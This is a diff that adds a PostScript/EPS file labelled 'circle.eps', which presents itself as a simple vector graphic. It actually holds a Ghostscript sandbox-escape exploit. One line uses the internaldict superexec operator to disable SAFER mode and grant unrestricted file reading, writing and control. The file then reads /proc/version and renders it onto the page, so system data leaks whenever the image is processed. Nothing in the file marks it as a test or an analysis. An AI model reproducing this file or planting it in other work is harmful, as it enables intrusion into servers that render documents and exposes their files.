@@ -1,0 +1,56 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%Document-Fonts: Times-Roman
+%%Title: circle.eps
+%%Creator: PS_Write.F
+%%CreationDate: 02-Aug-99
+%%Pages: 1
+%%BoundingBox:   36   36  576  756
+%%LanguageLevel: 1
+%%EndComments
+%%BeginProlog
+%%EndProlog
+/inch {72 mul} def
+/Palatino-Roman findfont
+1.00 inch scalefont
+setfont
+ 0.0000 0.0000 0.0000 setrgbcolor
+%% Page:     1    1
+save
+
+ /Courier             % name the desired font
+ 20 selectfont        % choose the size in points and establish
+                      % the font as the current one
+ 72 500 moveto        % position the current point at
+                      % coordinates 72, 500 (the origin is at the
+                      % lower-left corner of the page)
+
+{ systemdict /SAFER false put systemdict /userparams get /PermitFileControl [(*)] put systemdict /userparams get /PermitFileWriting [(*)] put systemdict /userparams get /PermitFileReading  [(*)] put } 1183615869 internaldict /superexec get exec
+
+/infile (/proc/version) (r) file def % open files
+/buff 1024 string def             % buffer for reading
+/Courier 8 selectfont            % name and size of font
+/LM 40 def                       % x coord
+/ypos 400 def                    % y coord
+/lineheight 10 def               % height of a line
+/newline {                       % function for changing lines
+    ypos lineheight sub
+    /ypos exch def
+    LM ypos moveto
+} def
+LM ypos moveto                   % move to starting coords
+
+{ % read the file in loop
+        infile buff readline     % read the file 1 line at a time
+        { %ifelse
+                buff cvs show
+                newline
+        }
+        { %else
+                buff cvs show
+                infile closefile % close file pointer
+                exit             % exit the loop
+        } ifelse
+} bind loop
+
+ showpage             % print all on the page
+ %%Trailer
